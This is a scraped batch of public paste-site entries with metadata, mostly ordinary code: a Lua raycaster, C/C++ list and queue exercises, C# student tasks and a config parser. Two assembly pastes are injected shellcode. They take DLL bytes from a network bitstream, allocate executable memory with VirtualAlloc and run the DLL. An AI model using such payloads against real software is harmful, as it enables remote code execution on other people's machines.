		local tExit = (botright - origin) * invDirection

		local tMin = Vector2.new(math.max(math.min(tEnter.X, tExit.X), 0), math.max(math.min(tEnter.Y, tExit.Y), 0))
		local tMax = Vector2.new(math.min(math.max(tEnter.X, tExit.X), 1), math.min(math.max(tEnter.Y, tExit.Y), 1))

		if tMax.X < tMin.Y or tMax.Y < tMin.X then
			continue
		end

		local collisionTime = math.max(tMin.X, tMin.Y)
		if collisionTime >= closestTime then
			continue
		end

		local collisionPoint = origin + collisionTime * direction
		local collisionNormal

		if tMax.X > tMin.Y then
			if tEnter.X < tExit.X then
				collisionNormal = Vector2.new(-1, 0)
			else
				collisionNormal = Vector2.new(1, 0)
			end
		else
			if tEnter.Y < tExit.Y then
				collisionNormal = Vector2.new(0, -1)
			else
				collisionNormal = Vector2.new(0, 1)
			end
		end

		closestNormal = collisionNormal
		closestPosition = collisionPoint
		closestTime = collisionTime
		closestHit = id
	end

	if closestTime < math.huge then
		return {
			Hit = closestHit,
			Position = closestPosition,
			Normal = closestNormal,
		}
	end

	return false
end



return FireShapecast"
GHPRCGWx,p_server,IndoSofts,PHP,Monday 15th of April 2024 10:37:13 AM CDT,https://mx.ebizzleads.com/profilechecker/2024/response.js
B9RkydCm,Queue,rado_dimitrov66,C++,Monday 15th of April 2024 10:24:05 AM CDT,"#include <iostream>

using namespace std;

struct Queue
{
	int value;
	Queue* next;
} *first = NULL, * last = NULL;



void addValues(unsigned int& counter)
{

	Queue* p = last;

	int n;

	cout << ""Enter a value: "";
	cin >> n;

	last = new Queue;

	last->value = n;
	last->next = NULL;

	if (first == NULL)
	{
		first = last;
	}
	else
	{
		p->next = last;
	}

	counter++;

}

void removeValues()
{
	
	while (first)
	{
		Queue* p = first;

		first = p->next;
		delete p;
	}

	cout << ""The queue is already empty"" << endl;
	cout << endl;	

}

void printValues()
{
	Queue* p = first;

	while (p != NULL)
	{
		cout << p->value << "" "";
		p = p->next;
	}
	cout << endl;
}

void removeNAndChange(unsigned int& counter)
{
	int n;
	int x;

	Queue* p = first;

	do
	{
		cout << ""Enter a number of element to remove"" << ""["" << counter << ""-2]: "";
		cin >> n;

	} while (n < 2 || n > counter);

	cout << ""Enter a new value: "";
	cin >> x;

	if (n == 2)
	{
		p = p->next;

		first->value = x;

		first->next = p->next;

		delete p;

		counter--;

	}
	else {

		for (int i = 2; i <= n - 1; i++)
		{
			p = p->next;

		}

		p->value = x;

		if (n < counter)
		{
			p->next = p->next->next;

			p = p->next;

			delete p;
		}
		else
		{
			p->next = NULL;
		}

		counter--;
	}

}

int main()
{
	short choose = -1;

	unsigned int counter = 0;

	do
	{

		cout << ""[1] Add a value to the queue\n[2] Remove element/s\n[3] Print all elements\n[4] Remove N element by last to start and Change value on N-1\n"";
		cin >> choose;

		switch (choose)
		{

		case 1:

			system(""cls"");

			addValues(counter);


			choose = -1;


			break;

		case 2:

			system(""cls"");

			if (first)
			{
				removeValues();
			}
			else
			{
				cout << ""The queue is empty"" << endl;
			}

			choose = -1;

			break;


		case 3:

			system(""cls"");

			if (first)
			{
				printValues();
			}
			else
			{
				cout << ""The queue is empty"" << endl;
			}

			choose = -1;

			break;
		case 4:

			system(""cls"");

			if (first)
			{
				removeNAndChange(counter);
			}
			else {
				cout << ""The queue is empty"" << endl;
			}

			choose = -1;

			break;
		default:
			break;
		}

	} while (choose < 0 || choose > 4);
}

"
LneR80ZG,Untitled,_KAGATUN_,C#,Monday 15th of April 2024 10:23:55 AM CDT,"//Написать программу администрирования супермаркетом.
//В супермаркете есть очередь клиентов.
//У каждого клиента в корзине есть товары, также у клиентов есть деньги.
//Клиент, когда подходит на кассу, получает итоговую сумму покупки и старается её оплатить.
//Если оплатить клиент не может, то он рандомный товар из корзины выкидывает до тех пор, пока его денег не хватит для оплаты.
//Клиентов можно делать ограниченное число на старте программы.
//Супермаркет содержит список товаров, из которых клиент выбирает товары для покупки.

using System;
using System.Collections.Generic;

namespace Supermarket
{
    class Program
    {
        static void Main(string[] args)
        {
            Shop shop = new Shop();
            shop.ShopWork();
        }
    }

    public class Utilities
    {
        private static Random _random = new Random();

        public static int GetRandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        public static int GetRandomNumber(int max)
        {
            return _random.Next(max);
        }
    }

    class Product
    {
        public Product(string title, int price)
        {
            Title = title;
            Price = price;
        }

        public string Title { get; private set; }

        public int Price { get; private set; }

        public void ShowProduct()
        {
            Console.WriteLine($""\n\tНаименование товара: {Title} \tЦена товара: {Price}"");
        }
    }

    class Buyer
    {
        private List<Product> _basket;

        private int _minRandomMoney = 500;
        private int _maxRandomMoney = 3000;

        private string _name;

        public Buyer(string name)
        {
            _name = name;

            _basket = new List<Product>();

            Money = Utilities.GetRandomNumber(_minRandomMoney, _maxRandomMoney);
        }

        public int Money { get; private set; }

        public void ShowInfo(string text)
        {
            Console.WriteLine($""\n{_name}. Капитал: {Money}"");

            if (_basket.Count == 0)
            {
                Console.WriteLine($""\nКорзина пуста"");
            }
            else
            {
                Console.WriteLine(text);

                for (int i = 0; i < _basket.Count; i++)
                {
                    _basket[i].ShowProduct();
                }

                Console.WriteLine(""----------------"");
            }
        }

        public void TryBuyProducts()
        {
            Console.WriteLine($""Общая стоимость продуктов в корзине {GetTotalPrice()}"");

            RemoveRandomProduct();
            PayProduct();
            ShowInfo(""Купленный товар:"");
        }

        public void FillBasket(List<Product> products)
        {
            int randomProductCount = Utilities.GetRandomNumber(products.Count);

            for (int i = 0; i < randomProductCount; i++)
            {
                int index = Utilities.GetRandomNumber(products.Count);
                _basket.Add(products[index]);
            }
        }

        private void PayProduct()
        {
            Money -= GetTotalPrice();
        }

        private int GetTotalPrice()
        {
            int totalPrice = 0;

            for (int i = 0; i < _basket.Count; i++)
            {
                totalPrice += _basket[i].Price;
            }

            return totalPrice;
        }

        private void RemoveRandomProduct()
        {
            while (GetTotalPrice() > Money && _basket.Count > 0)
            {
                _basket.Remove(_basket[Utilities.GetRandomNumber(_basket.Count)]);
            }
        }
    }

    class Shop
    {
        private int _money = 0;

        private List<Product> _assortment;

        private Queue<Buyer> _buyers;

        public Shop()
        {
            _buyers = new Queue<Buyer>();

            _assortment = new List<Product>
            {
                new Product(""Блендер"", 1100),
                new Product(""Картофель мытый в сетке 5кг"", 280),
                new Product(""Зубная паста Большой тюбик"", 250),
                new Product(""Яблоко сорт Голд 1 шт"", 35),
                new Product(""Лук в сетке Эконом 3кг"", 165),
                new Product(""Хлеб"", 55),
                new Product(""Молоко 1 литр"", 65),
                new Product(""Коффе Якобс 185гр"", 275),
                new Product(""Свинина 1кг"", 260),
                new Product(""Курица Бройлер2кг охлажденная"", 380),
                new Product(""Мука 1 сорт 1кг"", 85),
                new Product(""Апельсин 1кг"", 130),
                new Product(""Торт Наполеон 500гр"", 475),
                new Product(""Банан 1кг"", 80),
                new Product(""Сметана стакан 250гр"", 75),
                new Product(""Макароны Макфа 200гр"", 150),
                new Product(""Сельдь филе кусочками 500гр"", 380)
            };
        }

        public void ShopWork()
        {
            Shop shop = new Shop();
            shop.ShowAssortment();
            shop.CreateQueue();
            shop.ShowBuyers();
            shop.FillBuyersBasket();
            shop.ShowBuyers();
            shop.ServeBuyers();
        }

        private void MakeProfit(List<Product> product)
        {
            for (int i = 0; i < product.Count; i++)
            {
                _money += product[i].Price;
            }
        }

        private void CreateQueue()
        {
            Console.WriteLine(""Покупатели:"");

            _buyers.Enqueue(new Buyer(""Наталья""));
            _buyers.Enqueue(new Buyer(""Александр""));
            _buyers.Enqueue(new Buyer(""Евгений""));
        }

        private void ShowBuyers()
        {
            foreach (Buyer buyer in _buyers)
            {
                buyer.ShowInfo(""Товар в корзине"");
            }
        }

        private void ShowAssortment()
        {
            Console.WriteLine(""Ассортимент супермаркета:"");

            for (int i = 0; i < _assortment.Count; i++)
            {
                _assortment[i].ShowProduct();
            }
        }

        private void FillBuyersBasket()
        {
            foreach (Buyer buyer in _buyers)
            {
                buyer.FillBasket(new List<Product>(_assortment));
            }
        }

        private void ServeBuyers()
        {
            while (_buyers.Count > 0)
            {
                Buyer buyer = _buyers.Dequeue();
                buyer.TryBuyProducts();
            }
        }
    }
}
"
0g2YZCYb,Next Functional Component,fakesamgregory,JSON,Monday 15th of April 2024 10:22:27 AM CDT,"{
	// Place your global snippets here. Each snippet is defined under a snippet name and has a scope, prefix, body and 
	// description. Add comma separated ids of the languages where the snippet is applicable in the scope field. If scope 
	// is left empty or omitted, the snippet gets applied to all languages. The prefix is what is 
	// used to trigger the snippet and the body will be expanded and inserted. Possible variables are: 
	// $1, $2 for tab stops, $0 for the final cursor position, and ${1:label}, ${2:another} for placeholders. 
	// Placeholders with the same ids are connected.
	""Next Functional Component"": {
		""scope"": ""javascript,typescript,jsx,tsx"",
		""prefix"": ""nfc"",
		""body"": [
			""const $1 = () => {"",
			""  return ("",
			""    <div>"",
			""      $2"",
			""    </div>"",
			""  );"",
			""};"",
			"""",
			""export default $1;""
		],
		""description"": ""Create a new functional component""
	},

	""Next Route Component"": {
		""scope"": ""javascript,typescript,jsx,tsx"",
		""prefix"": ""nrpc"",
		""body"": [
			""export async function $1(request) {"",
			""  // const { $2 } = await request.json();"",
			"""",
			""	 if (!$2) {"",
			""	 	 return Response.json({"",
			""      success: false,""
			"" 	   message: \""Missing required fields\"","",
			""	     status: 400,"",
			""	 	 });"",
			""	 }"",
			"""",
			""  return Response.json({""
			""	   success: true,""
			""	   message: \""Route created successfully\"","",
			""    data: { someData: true },""
			""	   status: 200,""
			""  });""
			""}""
		],
		""description"": ""Create a new route component""
	}
}"
RsbARLBC,kv_parser,mdgaziur001,C,Monday 15th of April 2024 10:15:37 AM CDT,"#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct Config {
  bool  show_welcome;
  bool  kill_yourself;
  char* last_message;
};

char *get_key(const char **buf) {
  char *key = (char*)malloc(sizeof(char) * 12 + 1);
  if (key == NULL) {
    printf(""Failed to allocate buffer for key\n"");
    return NULL;
  }

  unsigned int key_size = 0;
  unsigned int key_cap = 12;

  while (**buf != '\0' && **buf != '\n' && **buf != '=') {
    if (**buf == ' ' || **buf == '\t') {
      *buf = *buf + 1;
      continue;
    }

    if (key_size >= key_cap) {
      key_cap *= 2;
      key = realloc(key, sizeof(char) * key_cap + 1);
      if (key == NULL) {
        printf(""Failed to reallocate buffer for key\n"");
        return NULL;
      }
    }

    key[key_size] = **buf;
    key_size++;
    *buf = *buf + 1;
  }
  key[key_size] = '\0';
  return key;
}

char *get_val(const char **buf) {
  char *key = (char*)malloc(sizeof(char) * 12 + 1);
  if (key == NULL) {
    printf(""Failed to allocate buffer for key\n"");
    return NULL;
  }

  // eat whitespaces till we reach a valid character
  while (**buf != '\0' && (**buf == ' '  || **buf == '\t')) {
    *buf = *buf + 1;
  }

  bool is_string = **buf == '""' ? true : false;
  if (is_string) *buf = *buf + 1;

  unsigned int key_size = 0;
  unsigned int key_cap = 12;

  while (**buf != '\0') {
    if (is_string && **buf == '""') {
      *buf = *buf + 1;
      break;
    } else if (**buf == '\n' || **buf == '=') {
      break;
    } else if (!is_string && (**buf == ' ' || **buf == '\t')) {
      *buf = *buf + 1;
      continue;
    }

    if (key_size >= key_cap) {
      key_cap *= 2;
      key = realloc(key, sizeof(char) * key_cap + 1);
      if (key == NULL) {
        printf(""Failed to reallocate buffer for key\n"");
        return NULL;
      }
    }

    key[key_size] = **buf;
    key_size++;
    *buf = *buf + 1;
  }
  key[key_size] = '\0';
  return key;
}

int parse_input(const char *buf, struct Config* cfg) {
  while (*buf != '\0') {
    char *key = get_key(&buf);
    if (key == NULL) return 1;
    buf++;

    char *val = get_val(&buf);
    if (val == NULL) return 1;
    buf++;
 
    if (strcmp(key, ""show_welcome"") == 0) {
      if (strcmp(val, ""true"") == 0) {
        cfg->show_welcome = true;
      } else if (strcmp(val, ""false"") != 0) {
        printf(""WARNING: wrong type of value for `show_welcome`, defaulting to `false`\n"");
      }

      free(key);
      free(val);
    } else if (strcmp(key, ""kill_yourself"") == 0) {
      if (strcmp(val, ""true"") == 0) {
        cfg->kill_yourself = true;
      } else if (strcmp(val, ""false"") != 0) {
        printf(""WARNING: wrong type of value for `kill_yourself`, defaulting to `false`\n"");
      }

      free(key);
      free(val);
    } else if (strcmp(key, ""last_message"") == 0) {
      free(cfg->last_message);
      cfg->last_message = val;
      
      free(key);
    } else {
      printf(""WARNING: unknown key '%s'\n"", key);
      free(key);
      free(val);
    }
  }
  return 0;
}

int main(int argc, const char** argv) {
  if (argc < 2) {
    printf(""Usage: %s [FILE]\n"", argv[0]);
    return 0;
  };

  FILE *fp = fopen(argv[1], ""r"");
  if (fp == NULL) {
    printf(""Failed to open file: %s\n"", argv[1]);
    return 1;
  }
  
  fseek(fp, 0L, SEEK_END);
  unsigned int sz = ftell(fp);
  rewind(fp);

  char *buf = (char*)malloc(sizeof(char) * sz + 1);
  if (!buf) {
    printf(""Failed to create buffer\n"");
    return 1;
  }

  fread(buf, sz, sizeof(char), fp);
  buf[sz] = '\0';

  fflush(fp);
  fclose(fp);

  struct Config *cfg = (struct Config*)malloc(sizeof(struct Config));
  cfg->show_welcome = false;
  cfg->kill_yourself = false;
  cfg->last_message = (char*)malloc(sizeof(char));
  cfg->last_message[0] = '\0';

  int ret = parse_input(buf, cfg);

  printf(""Config {\n""
         ""\tshow_welcome: %s,\n""
         ""\tkill_yourself: %s,\n""
         ""\tlast_message: \""%s\""\n""
         ""}\n"",
         cfg->show_welcome ? ""true"" : ""false"",
         cfg->kill_yourself ? ""true"" : ""false"",
         cfg->last_message
  );

  free(buf);
  free(cfg->last_message);
  free(cfg);

  return ret;
}
"
RZ3W4jnJ,костыль меню,Igor150195,JavaScript,Monday 15th of April 2024 10:11:24 AM CDT,"<script>
    document.addEventListener('DOMContentLoaded', function() {
        document.querySelectorAll('.popup-menu-sublevels .popup-sublevels-item').forEach(function(element) {
            let category = element.dataset.category;
            let subcategory = element.dataset.subcategory;
    
            if (category !== """" && subcategory !== """") {
                document.querySelectorAll('.nav-menu-item-wrap').forEach(function(menuItem) {
                    let currentCategory = menuItem.dataset.category;
                    let sublevelsHiddenContainer = menuItem.querySelector('.menu-sublevels-hidden');
    
                    if (category === currentCategory) {
                        sublevelsHiddenContainer.appendChild(element.cloneNode(true));
                    }
                });
            }
        });
    
        document.querySelectorAll('.nav-menu-item-wrap').forEach(function(menuItem) {
            let subcategoryNames = [];
            let sublevelsWrap = menuItem.querySelector('.menu-sublevels-wrap');
            let sublevels = menuItem.querySelectorAll('.popup-sublevels-item');
    
            sublevels.forEach(function(sublevel) {
                subcategoryNames.push(sublevel.dataset.subcategory);
            });
    
            let uniqueArr = Array.from(new Set(subcategoryNames));
    
            uniqueArr.forEach(function(subcategoryName) {
                sublevelsWrap.innerHTML += `
                    <div class=""menu-sublevels-box"">
                        <div class=""menu-sublevels-box-title subtitle-2"">${subcategoryName}</div>
                        <div class=""menu-sublevels-box-body""></div>
                    </div>
                `;
            });
        });
    
        document.querySelectorAll('.nav-menu-item-wrap').forEach(function(menuItem) {
            let boxes = menuItem.querySelectorAll('.menu-sublevels-box');
            let sublevels = menuItem.querySelectorAll('.menu-sublevels-hidden .popup-sublevels-item');
    
            boxes.forEach(function(box) {
                let boxBody = box.querySelector('.menu-sublevels-box-body');
                let boxSubcategory = box.querySelector('.menu-sublevels-box-title').textContent;
    
                sublevels.forEach(function(sublevel) {
                    let subcategory = sublevel.dataset.subcategory;
    
                    if (subcategory === boxSubcategory) {
                        boxBody.appendChild(sublevel.cloneNode(true));
                    }
                });
            });
        });
    });
</script>"
uvhzmzzR,raycasting,AlewAlow,Lua,Monday 15th of April 2024 10:11:24 AM CDT,"local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local UserInputService = game:GetService(""UserInputService"")

local Matter = require(ReplicatedStorage.Shared.Libs.Matter)
local Components = require(ReplicatedStorage.Shared.Components)
local Constants = require(ReplicatedStorage.Shared.Constants)

local GetEntityGlobalScale = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalScale)
local GetEntityGlobalPosition = require(ReplicatedStorage.Shared.Utils.GetEntityGlobalPosition)
local GetEntityDescendants = require(ReplicatedStorage.Shared.Utils.GetEntityDescendants)

local function FireRaycast(origin, direction, entities, world)
	if type(entities) == ""number"" then
		entities = GetEntityDescendants(entities, world)
	end

	local closestHitDistance = math.huge
	local closestHitNormal = nil
	local closestHitPosition = nil
	local closestHit = nil

	for _, id in entities do
		local transform = world:get(id, Components.Transform)
		if not transform then
			continue
		end

		local collider = world:get(id, Components.Collider)
		if not collider then
			continue
		end

		local globalSize = GetEntityGlobalScale(id, world) * collider.Size
		local globalPosition = GetEntityGlobalPosition(id, world)

		local tp = globalPosition - globalSize / 2
		local br = globalPosition + globalSize / 2
		
		local t1 = (tp - origin) / direction
		local t2 = (br - origin) / direction
		
		local entryTimeX = math.max(math.min(t1.X, t2.X), 0)
		local exitTimeX = math.min(math.max(t1.X, t2.X), 1)
		local entryTimeY = math.max(math.min(t1.Y, t2.Y), 0)
		local exitTimeY = math.min(math.max(t1.Y, t2.Y), 1)
		
		if entryTimeX > exitTimeY or entryTimeY > exitTimeX then
			continue
		end
		
		local hitDistance = math.max(entryTimeX, entryTimeY)
		if hitDistance >= closestHitDistance then
			continue
		end
		
		closestHitPosition = origin + direction * hitDistance
		closestHitDistance = hitDistance
		closestHit = id

		if entryTimeX > entryTimeY then
			if t1.X < t2.X then
				closestHitNormal = Vector2.new(-1, 0)
			else
				closestHitNormal = Vector2.new(1, 0)
			end
		else
			if t1.Y < t2.Y then
				closestHitNormal = Vector2.new(0, -1)
			else
				closestHitNormal = Vector2.new(0, 1)
			end
		end
	end

	if closestHitNormal then
		return {
			Position = closestHitPosition,
			Normal = closestHitNormal,
			Hit = closestHit,
		}
	end
	
	return false
end


return FireRaycast"
nS3EqeNx,Untitled,Rodunskiy,C#,Monday 15th of April 2024 09:15:16 AM CDT,"int goldCount;
int crystalPrice = 10;
int crystalCount;
int crystalAllPrice;
bool isBuying = false;

Console.WriteLine(""Сколько у вас золота в кошельке?"");
goldCount = Convert.ToInt32(Console.ReadLine());

while (isBuying != true)
{
    Console.Clear();
    Console.WriteLine($""У вас {goldCount} золота в кошельке.\nЦена 1 кристалла {crystalPrice} золота.\nСколько кристисталлов вы хотите купить?"");
    crystalCount = Convert.ToInt32(Console.ReadLine());

    crystalAllPrice = crystalCount * crystalPrice;

    if (crystalAllPrice <= goldCount)
    {
        goldCount -= crystalAllPrice;
        isBuying = true;

        Console.WriteLine($""Вы купили {crystalCount} кристаллов.\nВ кошельке осталось {goldCount} золота."");
    }
    else if (crystalAllPrice >= goldCount)
    {
        Console.WriteLine(""У вас недостаточно средств!\nПопробуйте еще раз."");
        Console.ReadLine();
    }
}



"
pjyibZzq,СПРИНТ № 7 | Модель памяти в C++ | Урок 4: Указатели и константность,chevengur,C++,Monday 15th of April 2024 09:10:41 AM CDT,"#include <algorithm>
#include <cassert>
#include <iostream>
#include <string>
#include <tuple>
#include <vector>

using namespace std;

// Породы кошек
enum class CatBreed {
    Bengal,
    Balinese,
    Persian,
    Siamese,
    Siberian,
    Sphynx,
};

// Пол
enum class Gender {
    Male,
    Female,
};

struct Cat {
    string name;
    Gender gender;
    CatBreed breed;
    int age;
};

string CatBreedToString(CatBreed breed) {
    switch (breed) {
    case CatBreed::Bengal:
        return ""Bengal""s;
    case CatBreed::Balinese:
        return ""Balinese""s;
    case CatBreed::Persian:
        return ""Persian""s;
    case CatBreed::Siamese:
        return ""Siamese""s;
    case CatBreed::Siberian:
        return ""Siberian"";
    case CatBreed::Sphynx:
        return ""Sphynx""s;
    default:
        throw invalid_argument(""Invalid cat breed""s);
    }
}

ostream& operator<<(ostream& out, CatBreed breed) {
    out << CatBreedToString(breed);
    return out;
}

ostream& operator<<(ostream& out, Gender gender) {
    out << (gender == Gender::Male ? ""male""s : ""female""s);
    return out;
}

ostream& operator<<(ostream& out, const Cat& cat) {
    out << '{' << cat.name << "", ""s << cat.gender;
    out << "", breed: ""s << cat.breed << "", age:""s << cat.age << '}';
    return out;
}

// Возвращает массив указателей на элементы вектора cats, отсортированные с использованием
// компаратора comp. Компаратор comp - функция, принимающая два аргумента типа const Cat&
// и возвращающая true, если значения упорядочены, и false в ином случае
template <typename Comparator>
vector<const Cat*> GetSortedCats(const vector<Cat>& cats, const Comparator& comp) {
    vector<const Cat*> sorted_cat_pointers;
    for (const auto& cat : cats)
    {
        sorted_cat_pointers.push_back(&cat);
    }

    sort(sorted_cat_pointers.begin(), sorted_cat_pointers.end(), [comp](const Cat* lhs, const Cat* rhs) {
        return comp(*lhs, *rhs);
    });
    
    /*
    Напишите тело функции самостоятельно. Подсказка:
    1) Поместите в массив sorted_cat_pointers адреса объектов из массива cats.
    2) Отсортируйте массив sorted_cat_pointers с помощью переданного компаратора comp.
       Так как comp сравнивает ссылки на объекты, а отсортировать нужно указатели,
       передайте в sort лямбда функцию, принимающую указатели и сравнивающую объекты
       при помощи компаратора comp:
       [comp](const Cat* lhs, const Cat* rhs) {
           return comp(*lhs, *rhs);
       }
    */
    return sorted_cat_pointers;
}

// Выводит в поток out значения объектов, на который ссылаются указатели вектора cat_pointers.
// Пример вывода элементов vector<const Cat*>:
// {{Tom, male, breed: Bengal, age:2}, {Charlie, male, breed: Balinese, age:7}}
void PrintCatPointerValues(const vector<const Cat*>& cat_pointers, ostream& out) {
    if (cat_pointers.empty())
        out << ""{}"";
    else {
        out << ""{"";
        bool alpha_ = true;
        for (const auto& cat_pointer : cat_pointers)
        {
            if (alpha_)
            {
                out << *cat_pointer;
                alpha_ = false;
            }
            else
            {
                out << "", "" << *cat_pointer;
            }
        }
        
        
        out << ""}"";
    }
}
        

int main() {
    const vector<Cat> cats = {
        {""Tom""s, Gender::Male, CatBreed::Bengal, 2},
        {""Leo""s, Gender::Male, CatBreed::Siberian, 3},
        {""Luna""s, Gender::Female, CatBreed::Siamese, 1},
        {""Charlie""s, Gender::Male, CatBreed::Balinese, 7},
        {""Ginger""s, Gender::Female, CatBreed::Sphynx, 5},
        {""Tom""s, Gender::Male, CatBreed::Siamese, 2},
    };

    {
        auto sorted_cats = GetSortedCats(cats, [](const Cat& lhs, const Cat& rhs) {
            return tie(lhs.breed, lhs.name) < tie(rhs.breed, rhs.name);
            });

        cout << ""Cats sorted by breed and name:""s << endl;
        PrintCatPointerValues(sorted_cats, cout);
        cout << endl;
    }

    {
        auto sorted_cats = GetSortedCats(cats, [](const Cat& lhs, const Cat& rhs) {
            return tie(lhs.gender, lhs.breed) < tie(rhs.gender, rhs.breed);
            });

        cout << ""Cats sorted by gender and breed:""s << endl;
        PrintCatPointerValues(sorted_cats, cout);
        cout << endl;
    }
    return 0;
}"
GvTtXYym,Untitled,Hidend,ASM (NASM),Monday 15th of April 2024 08:48:50 AM CDT,";# repair stack
lea esp, [ebp-0x128]

;# get bitstream
mov eax, [ebp+0x3c]             ;# caption
sub eax, 0x118                  ;# bitstream
mov ecx, [eax]                  ;# numberOfBitsUsed
mov edx, [eax+0x8]              ;# readOffset
mov esi, [eax+0xC]              ;# data ptr
add ecx, 7                      ;# numberOfBitsUsed bits to bytes
shr ecx, 3          
add edx, 7                      ;# readOffset bits to bytes
shr edx, 3          
sub ecx, edx                    ;# numberOfBitsUsed - readOffset = dll size
add esi, edx                    ;# data ptr         + readOffset = dll ptr

;# check if dll size is 0
test ecx, ecx                   ;# test ecx (dll size)
jz epilogue                     ;# if zero, skip to epilogue

;# call VirtualAlloc
push ecx                        ;# save ecx
push 0x40                       ;# flProtect = PAGE_EXECUTE_READWRITE
push 0x3000                     ;# flAllocationType = MEM_COMMIT | MEM_RESERVE
push ecx                        ;# dwSize = dll size
push 0                          ;# lpAddress = 0
mov eax, dword ptr [0x008581A4] ;# get VirtualAlloc
call eax                        ;# call VirtualAlloc
mov edi, eax
pop ecx                         ;# restore ecx

;# copy dll
rep movsb

;# execute dll
call eax
jmp epilogue 					;# To be honest, not sure if needed or it does directly go to epilogue

epilogue:
pop edi
pop esi
mov eax, 1
pop ebx
mov esp, ebp
pop ebp
ret 8"
82tBtdck,S9 SDA - liste simplu inlantuite,Alx09,C,Monday 15th of April 2024 08:41:54 AM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct nod { // definire lista
    struct nod* urm; // prima inlantuire
    int id;// elemente lista
}nod;


void AddSorted(struct nod* head, struct nod* p) {// functia de adaugare sortata
    struct nod* q = head;// nod folosit pentru parcurgea listei
    if (head == NULL) // (!head) verificam daca sunt elemente in lista
    {
        head = p;// daca nu sunt capul listel devine noul element
    }
    else if (head->id > p->id) { // verificam daca elementul adaugat trebuie adaugat in capul listei
        p->urm = head; //elementul aduaugat va avea in pareta dreapta lista existenta
        head = p; // noul element va devieni capatul(radidacian listi)
    }
    else {
        while (q->urm != NULL && q->urm->id < p->id) { // parcurgem lista ca sa gasim pozitia de inserare
            q = q->urm;// parcurgere lista
        }
        p->urm = q->urm;// elementu nou va avea in dreapta ce avea poztia la care s-a gasit inserarea
        q->urm = p;
    }
}
struct nod* Remove(struct nod* head, int id) { //sterge nod
    struct nod* aux = NULL, *q = NULL;// nodul aux este pentreu retinire tempara nod sters, q este folosit pentru parcurgere
    if (head == NULL) {// verificam daca capul este null altfel return null ca si adresa
        return NULL;
    }
    else if (head->id == id) {// verificam daca este capul listei nodul sters
        aux = head;// salvam temporar nodul
        head = head->urm;// capul devine umaatorul element
        return aux;// returnam adresa nodul pe care vrem sa-l stergem in caz ce se vrea prelucat ceva dupa
    }
    else {
        q = head;// daca nu e la inceput parcurgem lista
        while (q->urm  != NULL && q->urm->id != id) {// ca la adaugarea sorata cautam pozita anterioara nodul pe care vrem sa-l stergem
            q = q->urm;// parcurgem lista
        }
        if (q->urm == NULL) {// daca s-a ajuns la sfarsitul listei si nu s-a gasit
            return NULL;// returnam null deoarece nodul nu se afla in lista
        }
        else {
            aux = q->urm;// altfel salvam nodul urmator(nodul ce trebuie stres)
            q->urm = q->urm->urm;// nodul anterior va pointa catre nodul din dtreapa celui sters
            return aux;// returnam nodul pe care vrem sa-l stergem
        }
    }
}// atentie aici am refacut legaturile, memoria va ramane alocata pana se foloseste free()


void Show(struct nod* head) {// toat functiile le am implementat sa primeasca head deaorece e mai ok asa
    struct nod* p = head;// ne punem pe capul listei

    while (p != NULL) {// cat timp nu s-a ajuns la sfarsitul fiserului
        printf(""%d "", p->id);// afisam id
        p = p->urm;// parcurgem lista
    }
}


int main()
{
    int v[] = {4, 1, 5, 8, 3, 0}, n = sizeof(v)/ 4;// initialziam mai usor lementele listei

    int i;
    struct nod* p = NULL;// nodul nou adaugat
    struct nod* head = NULL;// capul listei
    for (i = 0; i < n; i++) {// facem un for pentru a adauga mai usor elementele exemplu
        p = (nod*)malloc(sizeof(struct nod));// alocam memorie penteu fiecare element si salvam temprorar in p adresa returnata de malloc
        p->id = v[i];// atrbuim valoareaa
        p-> urm = NULL;// mereu sa intializati nodurile cu NULL
        AddSorted(&head, &p);//Apelam functia de sortare - sa folositi mereu & pentru ca apar probleme
    }
    printf(""Lista simplu inlantuita - Adaugare sortata: "");  Show(head);// afisam
    p = Remove(&head, 3);// apelam functia de sorate care returneaza adresa nodul de sters
    free(p);// aici eliberam memoria alocata.
    printf(""\nDupa eliminarea elemtului 3: "");  Show(head);
    p = Remove(&head, 8);
    free(p);
    printf(""\nDupa eliminarea elemtului 8: "");  Show(head);
    p = Remove(&head, 0);
    free(p);
    printf(""\nDupa eliminarea elemtului 0: "");  Show(head);
}"
CpG0vcGC,Untitled,Rodunskiy,C#,Monday 15th of April 2024 08:36:52 AM CDT,"string name = ""Баранов"";
string surname = ""Олег"";
string temporaryVariable;

Console.WriteLine($""Имя:{name}\nФамилия:{surname}\n"");

temporaryVariable = name;
name = surname;
surname = temporaryVariable;

Console.WriteLine($""Имя:{name}\nФамилия:{surname}"");"
BZc3zxGg,Untitled,Hidend,ASM (NASM),Monday 15th of April 2024 08:35:03 AM CDT,";# repair stack
lea esp, [ebp-0x128]

;# get bitstream
mov eax, [ebp+0x3c]             ;# caption
sub eax, 0x118                  ;# bitstream
mov ecx, [eax]                  ;# numberOfBitsUsed
mov edx, [eax+0x8]              ;# readOffset
mov esi, [eax+0xC]              ;# data ptr
add ecx, 7                      ;# numberOfBitsUsed bits to bytes
shr ecx, 3          
add edx, 7                      ;# readOffset bits to bytes
shr edx, 3          
sub ecx, edx                    ;# numberOfBitsUsed - readOffset = dll size
add esi, edx                    ;# data ptr         + readOffset = dll ptr

;# check if empty
test ecx, ecx
jz epilogue

;# call VirtualAlloc
push ecx                        ;# save ecx
push 0x40                       ;# flProtect = PAGE_EXECUTE_READWRITE
push 0x3000                     ;# flAllocationType = MEM_COMMIT | MEM_RESERVE
push ecx                        ;# dwSize = dll size
push 0                          ;# lpAddress = 0
mov eax, dword ptr [0x008581A4] ;# get VirtualAlloc
call eax                        ;# call VirtualAlloc
mov edi, eax
pop ecx                         ;# restore ecx

;# copy dll
rep movsb

;# execute dll
call eax

;# epilogue
pop edi
pop esi
mov eax, 1
pop ebx
mov esp, ebp
pop ebp
ret 8"
daWf7KT8,Untitled,Rodunskiy,C#,Monday 15th of April 2024 08:29:42 AM CDT,"int pictures = 52;
int picturesCountInRow = 3;
int filledRows;
int extraPictures;

filledRows = pictures / picturesCountInRow;
extraPictures = pictures % picturesCountInRow;

Console.WriteLine($""Полностью заполненные ряды:{filledRows}\nЛишние картинки:{extraPictures}"");"
zFgybQwr,Untitled,wym1111,C++,Monday 15th of April 2024 08:21:01 AM CDT,"#include <bits/stdc++.h>
using namespace std;

int n;
int a[4];
int ans = 200;

void dfs (int x, int b[4]) {
	for (int i = 0; i < 4; i ++) {
